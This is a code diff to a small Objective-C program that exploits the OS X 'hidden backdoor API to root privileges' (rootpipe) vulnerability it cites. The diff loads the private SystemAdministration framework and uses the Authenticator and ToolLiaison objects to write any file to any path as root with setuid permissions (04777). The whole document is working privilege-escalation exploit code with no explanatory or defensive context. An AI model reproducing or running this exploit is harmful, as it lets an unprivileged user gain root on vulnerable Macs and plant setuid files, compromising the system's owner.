@@ -1,9 +1,8 @@
 #import <Foundation/Foundation.h>
 #import <SecurityFoundation/SFAuthorization.h>
 
-#import <objc/runtime.h>
-
-// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
+#include <objc/runtime.h>
+#include <dlfcn.h>
 
 int main(int argc, const char *argv[])
 {
@@ -16,8 +15,19 @@ int main(int argc, const char *argv[])
 	
 	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 	
-	NSData *data = [NSData dataWithContentsOfFile:@(argv[1])];
-	NSString *path = @(argv[2]);
+	BOOL isDir;
+	
+	if (![[NSFileManager defaultManager] fileExistsAtPath:@(argv[1]) isDirectory:&isDir] || isDir)
+	{
+		fprintf(stderr, "Invalid source.\n");
+		
+		return EXIT_FAILURE;
+	}
+	
+	
+	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
+	
+	dlopen("/System/Library/PrivateFrameworks/SystemAdministration.framework/Versions/A/SystemAdministration", RTLD_LAZY | RTLD_GLOBAL);
 	
 	id authent = [objc_lookUpClass("Authenticator") sharedAuthenticator];
 	
@@ -28,7 +38,8 @@ int main(int argc, const char *argv[])
 	id st = [objc_lookUpClass("ToolLiaison") sharedToolLiaison];
 	id tool = [st tool];
 	
-	[tool createFileWithContents:data path:path attributes:@{ NSFilePosixPermissions: @04777 }];
+	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
+	
 	
 	[pool drain];
 	
